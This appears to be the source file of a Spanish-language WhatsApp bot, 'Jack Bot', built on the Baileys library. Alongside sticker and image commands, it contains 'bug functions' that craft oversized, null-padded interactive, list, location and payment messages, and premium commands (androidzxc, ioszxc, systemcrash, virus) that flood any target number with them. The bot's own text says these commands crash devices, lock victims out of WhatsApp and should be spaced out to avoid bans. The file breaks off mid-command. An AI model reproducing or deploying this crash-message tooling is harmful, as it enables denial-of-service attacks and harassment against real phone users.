const { default: makeWaSocket, useMultiFileAuthState, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@whiskeysockets/baileys')
const os = require('os')
const fs = require('fs')
const fsx = require('fs-extra')
const path = require('path')
const util = require('util')
const chalk = require('chalk')
const moment = require('moment-timezone')
const speed = require('performance-now')
const ms = toMs = require('ms')
const axios = require('axios')
const fetch = require('node-fetch')
const pino = require('pino')
const ytdl = require("ytdl-core")
const { exec, spawn, execSync } = require("child_process")
const { performance } = require('perf_hooks')
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
const { TelegraPh, UploadFileUgu, webp2mp4File, floNime } = require('./lib/uploader')
const { toAudio, toPTT, toVideo, ffmpeg, addExifAvatar } = require('./lib/converter')
const { smsg, getGroupAdmins, formatp, jam, formatDate, getTime, isUrl, await, sleep, clockString, msToDate, sort, toNumber, enumGetKey, runtime, fetchJson, getBuffer, json, delay, format, logic, generateProfilePicture, parseMention, getRandom, pickRandom, reSize } = require('./lib/myfunc')
let afk = require("./lib/afk");
const { addPremiumUser, getPremiumExpired, getPremiumPosition, expiredCheck, checkPremiumUser, getAllPremiumUser } = require('./lib/premiun')
const { fetchBuffer, buffergif } = require("./lib/myfunc2")


//database
let premium = JSON.parse(fs.readFileSync('./database/premium.json'))
let _owner = JSON.parse(fs.readFileSync('./database/owner.json'))
let owner = JSON.parse(fs.readFileSync('./database/owner.json'))
let _afk = JSON.parse(fs.readFileSync('./database/afk-user.json'))
let hit = JSON.parse(fs.readFileSync('./database/total-hit-user.json'))

module.exports = JackBot = async (JackBot, m, msg, chatUpdate, store) => {
  try {
    const {
      type,
      quotedMsg,
      mentioned,
      now,
      fromMe
    } = m
    var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectreplygcjack.selectedRowId : (m.mtype == 'templateButtonreplygcjackMessage') ? m.message.templateButtonreplygcjackMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectreplygcjack.selectedRowId || m.text) : ''
    var budy = (typeof m.text == 'string' ? m.text : '')
    var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
    const isCmd = body.startsWith(prefix)
    const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
    const args = body.trim().split(/ +/).slice(1)
    const full_args = body.replace(command, '').slice(1).trim()
    const pushname = m.pushName || "No Name"
    const botNumber = await JackBot.decodeJid(JackBot.user.id)
    const itsMe = m.sender == botNumber ? true : false
    const sender = m.sender
    const text = q = args.join(" ")
    const from = m.key.remoteJid
    const fatkuns = (m.quoted || m)
    const quoted = (fatkuns.mtype == 'buttonsMessage') ? fatkuns[Object.keys(fatkuns)[1]] : (fatkuns.mtype == 'templateMessage') ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] : (fatkuns.mtype == 'product') ? fatkuns[Object.keys(fatkuns)[0]] : m.quoted ? m.quoted : m
    const mime = (quoted.msg || quoted).mimetype || ''
    const qmsg = (quoted.msg || quoted)
    const isMedia = /image|video|sticker|audio/.test(mime)
    const isImage = (type == 'imageMessage')
    const isVideo = (type == 'videoMessage')
    const isAudio = (type == 'audioMessage')
    const isText = (type == 'textMessage')
    const isSticker = (type == 'stickerMessage')
    const isQuotedText = type === 'extendexTextMessage' && content.includes('textMessage')
    const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
    const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
    const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
    const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
    const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
    const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
    const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
    const sticker = []
    const isAfkOn = afk.checkAfkUser(m.sender, _afk)
    const isGroup = m.key.remoteJid.endsWith('@g.us')
    const groupMetadata = m.isGroup ? await JackBot.groupMetadata(m.chat).catch(e => { }) : ''
    const groupName = m.isGroup ? groupMetadata.subject : ''
    const participants = m.isGroup ? await groupMetadata.participants : ''
    const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
    const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
    const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
    const groupOwner = m.isGroup ? groupMetadata.owner : ''
    const isGroupOwner = m.isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender) : false
    const isCreator = [ownernumber, ..._owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
    const isPremium = isCreator || isCreator || checkPremiumUser(m.sender, premium);
    const clientId = JackBot.user.id.split(':')[0];
    const senderbot = m.key.fromMe ? JackBot.user.id.split(':')[0] + "@s.whatsapp.net" || JackBot.user.id : m.key.participant || m.key.remoteJid;
    const senderId = senderbot.split('@')[0];
    const isBot = clientId.includes(senderId);
    expiredCheck(JackBot, m, premium);



    //bug functions
    const sendReaction = async reactionContent => {
      JackBot.sendMessage(m.chat, {
        'react': {
          'text': reactionContent,
          'key': m.key
        }
      });
    };

    async function sendRepeatedMessages(jid, count) {
      for (let i = 0; i < count; i++) {
        JackBot.sendMessage(recipientJid, {
          'text': ''.repeat(50000)
        }, {
          'participant': {
            'jid': jid
          },
          'messageId': etc.key.id
        }, {
          'quoted': m
        });
      }
    }

    async function sendViewOnceMessages(jid, count) {
      for (let i = 0; i < count; i++) {
        let messageContent = generateWAMessageFromContent(jid, {
          'viewOnceMessage': {
            'message': {
              'messageContextInfo': {
                'deviceListMetadata': {},
                'deviceListMetadataVersion': 2
              },
              'interactiveMessage': proto.Message.InteractiveMessage.create({
                'body': proto.Message.InteractiveMessage.Body.create({
                  'text': ''
                }),
                'footer': proto.Message.InteractiveMessage.Footer.create({
                  'text': ''
                }),
                'header': proto.Message.InteractiveMessage.Header.create({
                  'title': '',
                  'subtitle': '',
                  'hasMediaAttachment': false
                }),
                'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  'buttons': [{
                    'name': "cta_url",
                    'buttonParamsJson': "{\"display_text\":\"ྦྷ\".repeat(50000),\"url\":\"https://www.google.com\",\"merchant_url\":\"https://www.google.com\"}"
                  }],
                  'messageParamsJson': "\0".repeat(100000)
                })
              })
            }
          }
        }, {});
        JackBot.relayMessage(jid, messageContent.message, {
          'messageId': messageContent.key.id
        });
      }
    }

    async function sendSystemCrashMessage(jid) {
      var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
        'viewOnceMessage': {
          'message': {
            'interactiveMessage': {
              'header': {
                'title': '',
                'subtitle': " "
              },
              'body': {
                'text': "我的主人 ˹Bless˼ 曾在這裡。"
              },
              'footer': {
                'text': 'xp'
              },
              'nativeFlowMessage': {
                'buttons': [{
                  'name': 'cta_url',
                  'buttonParamsJson': "{ display_text : '我的主人 ˹Bless˼ 曾在這裡。', url : , merchant_url :  }"
                }],
                'messageParamsJson': "\0".repeat(1000000)
              }
            }
          }
        }
      }), {
        'userJid': jid
      });
      await JackBot.relayMessage(jid, messageContent.message, {
        'participant': {
          'jid': jid
        },
        'messageId': messageContent.key.id
      });
    }
    async function sendListMessage(jid) {
      var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
        'listMessage': {
          'title': "我的主人 ˹Bless˼ 曾在這裡。" + "\0".repeat(920000),
          'footerText': "✅⃟╮",
          'description': "✅⃟╮",
          'buttonText': null,
          'listType': 2,
          'productListInfo': {
            'productSections': [{
              'title': "lol",
              'products': [{
                'productId': "4392524570816732"
              }]
            }],
            'productListHeaderImage': {
              'productId': "4392524570816732",
              'jpegThumbnail': null
            },
            'businessOwnerJid': "0@s.whatsapp.net"
          }
        },
        'footer': "lol",
        'contextInfo': {
          'expiration': 600000,
          'ephemeralSettingTimestamp': "1679959486",
          'entryPointConversionSource': "global_search_new_chat",
          'entryPointConversionApp': "whatsapp",
          'entryPointConversionDelaySeconds': 9,
          'disappearingMode': {
            'initiator': "INITIATED_BY_ME"
          }
        },
        'selectListType': 2,
        'product_header_info': {
          'product_header_info_id': 292928282928,
          'product_header_is_rejected': false
        }
      }), {
        'userJid': jid
      });

      await JackBot.relayMessage(jid, messageContent.message, {
        'participant': {
          'jid': jid
        },
        'messageId': messageContent.key.id
      });
    }

    async function sendLiveLocationMessage(jid) {
      var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
        'viewOnceMessage': {
          'message': {
            'liveLocationMessage': {
              'degreesLatitude': 'p',
              'degreesLongitude': 'p',
              'caption': '我的主人 ˹Bless˼ 曾在這裡。' + '\0'.repeat(50000),
              'sequenceNumber': '0',
              'jpegThumbnail': ''
            }
          }
        }
      }), {
        'userJid': jid
      });

      await JackBot.relayMessage(jid, messageContent.message, {
        'participant': {
          'jid': jid
        },
        'messageId': messageContent.key.id
      });
    }

    async function sendExtendedTextMessage(jid) {
      JackBot.relayMessage(jid, {
        'extendedTextMessage': {
          'text': '.',
          'contextInfo': {
            'stanzaId': jid,
            'participant': jid,
            'quotedMessage': {
              'conversation': '我的主人 ˹Bless˼ 曾在這裡。' + '\0'.repeat(50000)
            },
            'disappearingMode': {
              'initiator': "CHANGED_IN_CHAT",
              'trigger': "CHAT_SETTING"
            }
          },
          'inviteLinkGroupTypeV2': "DEFAULT"
        }
      }, {
        'participant': {
          'jid': jid
        }
      }, {
        'messageId': null
      });
    }
    async function sendPaymentInvite(jid) {
      JackBot.relayMessage(jid, {
        'paymentInviteMessage': {
          'serviceType': "UPI",
          'expiryTimestamp': Date.now() + 86400000
        }
      }, {
        'participant': {
          'jid': jid
        }
      });
    }

    async function sendMultiplePaymentInvites(jid, count) {
      for (let i = 0; i < count; i++) {
        sendPaymentInvite(jid);
        sendExtendedTextMessage(jid);
        await sleep(500);
      }
    }

    async function sendVariousMessages(jid, count) {
      for (let i = 0; i < count; i++) {
        sendListMessage(jid);
        sendLiveLocationMessage(jid);
        sendSystemCrashMessage(jid);
        await sleep(500);
      }
    }

    async function sendRepeatedMessages2(jid, count) {
      for (let i = 0; i < count; i++) {
        sendSystemCrashMessage(jid);
        sendSystemCrashMessage(jid);
        sendSystemCrashMessage(jid);
        await sleep(500);
      }
    }

    async function sendMixedMessages(jid, count) {
      for (let i = 0; i < count; i++) {
        sendLiveLocationMessage(jid);
        sendListMessage(jid);
        await sleep(500);
      }
    }

    function sendMessageWithMentions(text, mentions = [], quoted = false) {
      if (quoted == null || quoted == undefined || quoted == false) {
        return JackBot.sendMessage(m.chat, {
          'text': text,
          'mentions': mentions
        }, {
          'quoted': m
        });
      } else {
        return JackBot.sendMessage(m.chat, {
          'text': text,
          'mentions': mentions
        }, {
          'quoted': m
        });
      }
    }


    //end bug functions

    async function loadings() {
      var jacklod = [
        "《 █▒▒▒▒▒▒▒▒▒▒▒》10%",
        "《 ████▒▒▒▒▒▒▒▒》30%",
        "《 ████████████》100%",
        "loading complete"
      ]
      let { key } = await JackBot.sendMessage(from, { text: '*Sticker generado*' })

      for (let i = 0; i < jacklod.length; i++) {
        await JackBot.sendMessage(from, { text: jacklod[i], edit: key });
      }
    }

    // LOANDIG ERROR 
    async function loadingerror() {
      var jacklod = [
        "Cargando. . .",
        "█▒▒▒▒▒▒▒▒▒",
        "𝟐𝟎%",
        "███▒▒▒▒▒▒▒",
        "𝟓𝟎%",
        "█████▒▒▒▒▒",
        "𝟕𝟎%",
        "███████▒▒▒",
        "𝟏𝟎𝟎%",
        "██████████",
        "*💀 🗡ඩී ¡ERROR!*",
      ]
      let { key } = await JackBot.sendMessage(from, { text: '*💀 🗡ඩී ¡ERROR!*' })

      for (let i = 0; i < jacklod.length; i++) {
        await JackBot.sendMessage(from, { text: jacklod[i], edit: key });
      }
    }

    if (!JackBot.public) {
      if (!isCreator && !m.key.fromMe) return
    }


    //bot number online status, available=online, unavailable=offline
    JackBot.sendPresenceUpdate('uavailable', from)

    if (global.autorecordtype) {
      let xeonrecordin = ['recording', 'composing']
      let xeonrecordinfinal = xeonrecordin[Math.floor(Math.random() * xeonrecordin.length)]
      JackBot.sendPresenceUpdate(xeonrecordinfinal, from)

    }

    if (autobio) {
      JackBot.updateProfileStatus(`24/7 Online Bot By ${ownername}`).catch(_ => _)
    }
    if (m.sender.startsWith('92') && global.anti92 === true) {
      return JackBot.updateBlockStatus(m.sender, 'block')
    }
    //CONSOLA - TERMINAL
    const chalk = require('chalk');

    const formatDateTime = (date) => {
      return date.toLocaleString('es-PE', { timeZone: 'America/Lima', hour12: false });
    };

    if (m.message && m.isGroup) {
      console.log(chalk.cyan(`\n\n/)  /)  ~ ┏━━━━━━━━━━━━━━━━━┓
( •-• )  ~  𝗖𝗛𝗔𝗧 𝗗𝗘𝗟 𝗚𝗥𝗨𝗣𝗢 
/づづ ~   ┗━━━━━━━━━━━━━━━━━┛\n\n`));
      console.log(chalk.green(``));
      const dateTime = formatDateTime(new Date());
      console.log(`
    ${chalk.white.bgWhite('[ FECHA ]')} ${chalk.white.bgGreen(dateTime)}
    ${chalk.white.bgWhite('[ MENSAJE ]')} ${chalk.white.bgBlue(budy || m.mtype)}
    ${chalk.white.bgWhite('[ NUMBER ]')} ${chalk.green(m.sender.split('@')[0])}
    => Nombre del grupo ${chalk.green(groupName)} 
    => ID ${chalk.green(m.chat)}
  `);
    } else {
      console.log(chalk.cyan(`\n\n/)  /)  ~ ┏━━━━━━━━━━━━━━━━━┓
( •-• )  ~   𝗖𝗛𝗔𝗧 𝗣𝗘𝗥𝗦𝗢𝗡𝗔𝗟 
/づづ ~   ┗━━━━━━━━━━━━━━━━━┛\n\n`));
      console.log(chalk.green(`CHAT PRIVADO:`));
      const dateTime = formatDateTime(new Date());
      console.log(`
    ${chalk.white.bgWhite('[ FECHA ]')} ${chalk.white.bgGreen(dateTime)}
    ${chalk.white.bgWhite('[ MENSAJE ]')} ${chalk.bgBlue(budy || m.mtype)}
    ${chalk.white.bgWhite('[ NUMBER ]')} ${chalk.green(m.sender.split('@')[0])}
  `);
    }

    if (command) {
      const cmdadd = () => {
        hit[0].hit_cmd += 1
        fs.writeFileSync('./database/total-hit-user.json', JSON.stringify(hit))
      }
      cmdadd()
      const totalhit = JSON.parse(fs.readFileSync('./database/total-hit-user.json'))[0].hit_cmd
    }

    switch (command) {
      case 'addprem':
        if (!isCreator) return sendMessageWithMentions(mess.owner)
        if (args.length < 2)
          return sendMessageWithMentions(`*¡ERROR!*\n\nEstas usando mal el comando.\n\nAqui tienes dos ejemplos:\n\n#addprem 51985263152 30d\n\n#addprem @tag 30d`);
        if (m.mentionedJid.length !== 0) {
          for (let i = 0; i < m.mentionedJid.length; i++) {
            addPremiumUser(m.mentionedJid[0], args[1], premium);
          }
          sendMessageWithMentions("El numero ahora es usuario Premium")
        } else {
          addPremiumUser(args[0] + "@s.whatsapp.net", args[1], premium);
          sendMessageWithMentions("El numero ahora es usuario Premium")
        }
        break
      case 'delprem':
        if (!isCreator) return sendMessageWithMentions(mess.owner)
        if (args.length < 1) return sendMessageWithMentions(`*¡ERROR!*\n\nEstas usando mal el comando.\n\n𝘼𝙦𝙪𝙞 𝙩𝙞𝙚𝙣𝙚𝙨 𝙪𝙣 𝙚𝙟𝙚𝙢𝙥𝙡𝙤:\n\n#delprem 51985263152`);
        if (m.mentionedJid.length !== 0) {
          for (let i = 0; i < m.mentionedJid.length; i++) {
            premium.splice(getPremiumPosition(m.mentionedJid[i], premium), 1);
            fs.writeFileSync("./database/premium.json", JSON.stringify(premium));
          }
          sendMessageWithMentions("El usuario ya no es usuario Premium")
        } else {
          premium.splice(getPremiumPosition(args[0] + "@s.whatsapp.net", premium), 1);
          fs.writeFileSync("./database/premium.json", JSON.stringify(premium));
          sendMessageWithMentions("El usuario ya no es usuario Premium")
        }
        break
      case 'usuarios': {
        if (!isCreator) return sendMessageWithMentions(mess.owner);

        const getData = () => {
          try {
            const data = require("./database/premium.json");
            return data;
          } catch (error) {
            console.error("ERROR al leer premium.json:", error);
            return [];
          }
        };

        const data = getData();
        let txt = `*------「 LISTA PREMIUM 」------*\n\n`;

        for (const { id, expired } of data) {
          txt += `NÚMERO : ${id}\n`;
          txt += `EXPIRACION : ${expired} Segundos\n`;
        }

        JackBot.sendMessage(m.chat, {
          text: txt,
          mentions: [] // Reemplaza con la variable correcta que deseas mencionar
        }, {
          quoted: m
        });
        break;
      }
      //Comando que da informacion sobre los comandos.
      case 'premium': {
        const premiumCommands = `*Comandos Premiums*

*androidzxc*
> Este comando ralentiza el dispositivo Android de la persona afectada, haciendo que el sistema operativo comience a funcionar más lentamente y con errores graduales. Como resultado, WhatsApp también se verá afectado, negando el acceso a la aplicación.
*ioszxc*
> Ralentiza el dispositivo iOS afectado, causando fallos graduales en el sistema operativo y  en el acceso a WhatsApp.
*systemcrash*
> Genera un crash en el dispositivo Android afectado (versiones 10 o inferiores), mostrando un mensaje de error del sistema y afectando el acceso a WhatsApp.

📌 La manera en la que la persona afectada puede recuperar el acceso es eliminando la aplicación WhatsApp o teniendo su cuenta vinculada en WhatsApp Web :(

¿Quieres ser parte de la familia? comunícate con el siguiente número.
*[Click]* https://wa.me/51976254398`;

        await JackBot.sendMessage(m.chat, {
          text: premiumCommands,
          contextInfo: {
            externalAdReply: {
              showAdAttribution: true,
              title: `¿Quieres ser usuario Premium?`,
              body: `Lee lo siguiente ;)`,
              thumbnailUrl: 'https://i.ibb.co/80F70Nm/fonfovip.webp',
              sourceUrl: global.link,
              mediaType: 1,
              renderLargerThumbnail: true
            }
          }
        }, {
          quoted: m
        });
        break;
      }


      case 'owner': {
        let runtimetext = `Aquí te dejo mi número de WhatsApp para que se ponga en contacto conmigo.\n\n*[Click]* https://wa.me/51976254398`
        JackBot.sendMessage(m.chat, {
          text: runtimetext,
          contextInfo: {
            externalAdReply: {
              showAdAttribution: true,
              title: `Hola, soy Bless, creador de Jack Bot.`,
              body: `Proyecto en constante mejoras`,
              thumbnailUrl: 'https://i.ibb.co/58yWbpC/blesspresentacion.webp',
              sourceUrl: global.link,
              mediaType: 1,
              renderLargerThumbnail: true
            }
          }
        }, {
          quoted: m
        })
      }
        break

      case 'sticker': case 's': {
        if (/image/.test(mime)) {
          let media = await JackBot.downloadMediaMessage(qmsg)
          let encmedia = await JackBot.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
          await fs.unlinkSync(encmedia)
        } else if (/video/.test(mime)) {
          if (qmsg.seconds > 11) return sendMessageWithMentions('ERROR, el video no tiene que pasar de 10 segundos')
          let media = await JackBot.downloadMediaMessage(qmsg)
          let encmedia = await JackBot.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
          await fs.unlinkSync(encmedia)
        } else {
          if (qmsg.seconds > 11) return sendMessageWithMentions('ERROR, el video no tiene que pasar de 10 segundos')
          await loadingerror(), sendMessageWithMentions(`Etiqueta una imagen o video con el siguiente comando\n\n➥ *${prefix + command}*\n\nSi quieres convertir un video en sticker, asegurate que el video no pase de 10 segundos.`)
        }
      }
        break


      case 'toimage': case 'toimg': {
        if (!quoted) throw 'Etiqueta un sticker'
        if (!/webp/.test(mime)) throw `Tienes que etiquetar un sticker con el siguiente comando *${prefix + command}*`
        let media = await JackBot.downloadAndSaveMediaMessage(quoted)
        let ran = await getRandom('.png')
        exec(`ffmpeg -i ${media} ${ran}`, (err) => {
          fs.unlinkSync(media)
          if (err) throw err
          let buffer = fs.readFileSync(ran)
          JackBot.sendMessage(from, { image: buffer }, { quoted: m })
          fs.unlinkSync(ran)
        })
      }
        break;



      //Crash Whatsapp
      case "androidzxc": {
        if (!isPremium) return sendMessageWithMentions(mess.prem)
        if (!text) return sendMessageWithMentions(`*¡𝙀𝙍𝙍𝙊𝙍!*\n\n𝙀𝙨𝙩𝙖𝙨 𝙪𝙨𝙖𝙣𝙙𝙤 𝙞𝙣𝙘𝙤𝙧𝙧𝙚𝙘𝙩𝙖𝙢𝙚𝙣𝙩𝙚 𝙡𝙖 𝙛𝙪𝙣𝙘𝙞𝙤𝙣..\n\n𝘼𝙦𝙪𝙞 𝙩𝙞𝙚𝙣𝙚𝙨 𝙪𝙣 𝙚𝙟𝙚𝙢𝙥𝙡𝙤:\n${prefix + command} 51999999999,5`)
        let number = text.split(',')[0];
        let amount = text.split(',')[1] * 5;
        if (!number || !amount) {
          return sendMessageWithMentions(`Estas usando el comando mal...\n\n*Ejemplos:*\n${prefix + command} + número + , + 5\n${prefix + command} 51999999999,5`)
        }
        if (isNaN(parseInt(amount))) {
          return sendMessageWithMentions("Solo numeros individuales, ejemplo 1 - 2 - 3");
        }
        let cleanedNumber = number.replace(/[^0-9]/g, '');
        let encodedAmount = '' + encodeURI(amount);
        var contactInfo = await JackBot.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
        let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
        if (["51929766663", "51976254398", "51919465759", "51933778631"].includes(cleanedNumber)) {
          // No hacer nada, salir de la función
          return;
        }
        if (contactInfo.length == 0) {
          return sendMessageWithMentions("El número no está registrado en WhatsApp");
        }
        sendMessageWithMentions("virus en process..");
        await sleep(2000);
        sendVariousMessages(whatsappNumber, encodedAmount);
        await sleep(2500);
        sendMessageWithMentions(
          "*Virus enviado correctamente.*\n\n*victima* @" + whatsappNumber.split('@')[0] +
          "\n Comando *" + command + "* ✅\n\n*IMPORTANTE*\nUtiliza esta funcion cada 3 minutos para que el sistema no sea baneado por wsp.",
          [whatsappNumber]
        );
      }
        break;
        
      case "ioszxc": {
        if (!isPremium) return sendMessageWithMentions(mess.prem)
        if (!text) return sendMessageWithMentions(`*¡𝙀𝙍𝙍𝙊𝙍!*\n\n𝙀𝙨𝙩𝙖𝙨 𝙪𝙨𝙖𝙣𝙙𝙤 𝙞𝙣𝙘𝙤𝙧𝙧𝙚𝙘𝙩𝙖𝙢𝙚𝙣𝙩𝙚 𝙡𝙖 𝙛𝙪𝙣𝙘𝙞𝙤𝙣..\n\n𝘼𝙦𝙪𝙞 𝙩𝙞𝙚𝙣𝙚𝙨 𝙪𝙣 𝙚𝙟𝙚𝙢𝙥𝙡𝙤:\n${prefix + command} 51999999999,5`)
        let number = text.split(',')[0];
        let amount = text.split(',')[1] * 5;
        if (!number || !amount) {
          return sendMessageWithMentions(`Estas usando el comando mal...\n\n*Ejemplos:*\n${prefix + command} + número + , + 5\n${prefix + command} 51999999999,5`)
        }
        if (isNaN(parseInt(amount))) {
          return sendMessageWithMentions("Solo numeros individuales, ejemplo 1 - 2 - 3");
        }
        let cleanedNumber = number.replace(/[^0-9]/g, '');
        let encodedAmount = '' + encodeURI(amount);
        var contactInfo = await JackBot.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
        let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
        if (["51929766663", "51976254398", "51919465759", "51933778631"].includes(cleanedNumber)) {
          // No hacer nada, salir de la función
          return;
        }
        if (contactInfo.length == 0) {
          return sendMessageWithMentions("El número no está registrado en WhatsApp");
        }
        sendMessageWithMentions("virus en process..");
        await sleep(2000); // Adjusted sleep time for clarity
        sendMultiplePaymentInvites(whatsappNumber, encodedAmount);
        await sleep(2500); // Adjusted sleep time for clarity
        sendMessageWithMentions(
          "*Virus enviado correctamente.*\n\n*victima* @" + whatsappNumber.split('@')[0] +
          "\n Comando *" + command + "* ✅\n\n*IMPORTANTE*\nUtiliza esta funcion cada 3 minutos para que el sistema no sea baneado por wsp.",
          [whatsappNumber]
        );
      }
        break;
        
      /*case "iosbattery": {
        if (!isPremium) return sendMessageWithMentions(mess.prem)
        if (!text) return sendMessageWithMentions(`*¡𝙀𝙍𝙍𝙊𝙍!*\n\n𝙀𝙨𝙩𝙖𝙨 𝙪𝙨𝙖𝙣𝙙𝙤 𝙞𝙣𝙘𝙤𝙧𝙧𝙚𝙘𝙩𝙖𝙢𝙚𝙣𝙩𝙚 𝙡𝙖 𝙛𝙪𝙣𝙘𝙞𝙤𝙣..\n\n𝘼𝙦𝙪𝙞 𝙩𝙞𝙚𝙣𝙚𝙨 𝙪𝙣 𝙚𝙟𝙚𝙢𝙥𝙡𝙤:\n${prefix + command} 51999999999,5`)
        let number = text.split(',')[0];
        let amount = text.split(',')[1] * 5;
        if (!number || !amount) {
          return sendMessageWithMentions(`Estas usando el comando mal...\n\n*Ejemplos:*\n${prefix + command} + número + , + 5\n${prefix + command} 51999999999,5`)
        }
        if (isNaN(parseInt(amount))) {
          return sendMessageWithMentions("Solo numeros individuales, ejemplo 1 - 2 - 3");
        }
        let cleanedNumber = number.replace(/[^0-9]/g, '');
        let encodedAmount = '' + encodeURI(amount);
        var contactInfo = await JackBot.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
        let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
        if (["51929766663", "51976254398", "51919465759", "51933778631"].includes(cleanedNumber)) {
          // No hacer nada, salir de la función
          return;
        }
        if (contactInfo.length == 0) {
          return sendMessageWithMentions("El número no está registrado en WhatsApp");
        }
        sendMessageWithMentions("virus en process..");
        await sleep(2000); // Adjusted sleep time for clarity
        sendMultiplePaymentInvites(whatsappNumber, encodedAmount);
        await sleep(2500); // Adjusted sleep time for clarity
        sendMessageWithMentions(
          "*Virus enviado correctamente.*\n\n*victima* @" + whatsappNumber.split('@')[0] +
          "\n Comando *" + command + "* ✅\n\n*IMPORTANTE*\n*Utiliza esta funcion cada 3 minutos para que el sistema no sea baneado por wsp.*",
          [whatsappNumber]
        );
      }
        break;*/

      case "virus":
        {
          if (!isCreator) {
            return sendMessageWithMentions("*HEY! Usted no puedes usar esta funcion*");
          }
          if (!text) {
            return sendMessageWithMentions("Ejemplo de uso: ${ prefix + command} 5")
          }
          if (isNaN(parseInt(text))) {
            return sendMessageWithMentions("Solo numeros individuales, ejemplo 1 - 2 - 3");
          }
          let cleanedNumber = text.replace(/\D+/g, ''); // Remove non-numeric characters
          if (["51929766663", "51976254398", "51919465759", "51933778631"].includes(cleanedNumber)) {
            return; // No hacer nada, salir de la función
          }
          let encodedValue = encodeURI(text) * 200; // Adjusted calculation for clarity
          sendMessageWithMentions("virus en process..");
          await sleep(1500); // Adjusted sleep time for clarity
          sendVariousMessages(from, encodedValue);
          await sleep(2500); // Adjusted sleep time for clarity
          sendReaction('✅');
        }
        break;

      /*case "gp":
        {
          if (!isPremium) return sendMessageWithMentions(mess.prem)
          if (!text) {
            return sendMessageWithMentions("*¿NO SABES COMO USAR EL COMANDO?*\n\n" + (prefix + command) + " https://chat.whatsapp.com/xxxx\n\n_*Nota:*_ Si desea enviar una gran cantidad de virus, escriba lo siguiente:\n\n ." + command + " url + cantidad de virus\n\nEjemplo:\n." + command + " https://chat.whatsapp.com/xxxx 10");
          }
          sendMessageWithMentions("Espera por favor, " + command + "virus en process..");
          if (!text.split(" ")[0].includes("whatsapp.com")) {
            return sendMessageWithMentions("Link Invalid!");
          }
          let groupLink = text.split(" ")[0].split("https://chat.whatsapp.com/")[1];
          try {
            let bugAmount = text.split(" ")[1] ? text.split(" ")[1] : '1';
            let groupTarget = await JackBot.groupAcceptInvite(groupLink);
            await sleep(2000); // Adjusted sleep time for clarity
            sendViewOnceMessages(groupTarget, bugAmount);
            await sleep(2500); // Adjusted sleep time for clarity
            sendMessageWithMentions("*LISTO ✅ ¡EL VIRUS HA SIDO ENVIADO AL GRUPO!.*");
            JackBot.groupLeave(groupTarget);
          } catch (error) {
            sendMessageWithMentions(util.format(error));
          }
        }
        break;*/
      case "systemcrash": {
        if (!isPremium) return sendMessageWithMentions(mess.prem)
        if (!text) return sendMessageWithMentions(`*¡𝙀𝙍𝙍𝙊𝙍!*\n\n𝙀𝙨𝙩𝙖𝙨 𝙪𝙨𝙖𝙣𝙙𝙤 𝙞𝙣𝙘𝙤𝙧𝙧𝙚𝙘𝙩𝙖𝙢𝙚𝙣𝙩𝙚 𝙡𝙖 𝙛𝙪𝙣𝙘𝙞𝙤𝙣..\n\n𝘼𝙦𝙪𝙞 𝙩𝙞𝙚𝙣𝙚𝙨 𝙪𝙣 𝙚𝙟𝙚𝙢𝙥𝙡𝙤:\n${prefix + command} 51999999999,5`)
        let number = text.split(',')[0];
        let amount = text.split(',')[1] * 5;
        if (!number || !amount) {
          return sendMessageWithMentions(`Estas usando el comando mal...\n\n*Ejemplos:*\n${prefix + command} + número + , + 5\n${prefix + command} 51999999999,5`)
        }
        if (isNaN(parseInt(amount))) {
          return sendMessageWithMentions("Solo numeros individuales, ejemplo 1 - 2 - 3");
        }
        let cleanedNumber = number.replace(/[^0-9]/g, '');
        let encodedAmount = '' + encodeURI(amount);
        var contactInfo = await JackBot.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
        let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
        if (["51929766663", "51976254398", "51919465759", "51933778631"].includes(cleanedNumber)) {
          // No hacer nada, salir de la función
          return;
        }
        if (contactInfo.length == 0) {
          return sendMessageWithMentions("El número no está registrado en WhatsApp");
        }
        sendMessageWithMentions("virus en process..");
        await sleep(2000); // Adjusted sleep time for clarity
